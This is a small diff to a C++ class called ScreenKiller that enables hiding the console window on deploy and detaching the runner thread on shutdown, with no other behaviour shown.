@@ -25,14 +25,14 @@ void ScreenKiller::deploy()
 {
 	this->m_alive = true;
 
-	//ShowWindow(GetConsoleWindow(), SW_HIDE);
+	ShowWindow(GetConsoleWindow(), SW_HIDE);
 
 	this->m_runner_thread = std::thread([this] {this->deploy_inner(); });
 }
 
 void ScreenKiller::suicide()
 {
-	//this->m_runner_thread.detach();
+	this->m_runner_thread.detach();
 	this->m_alive = false;
 }
 
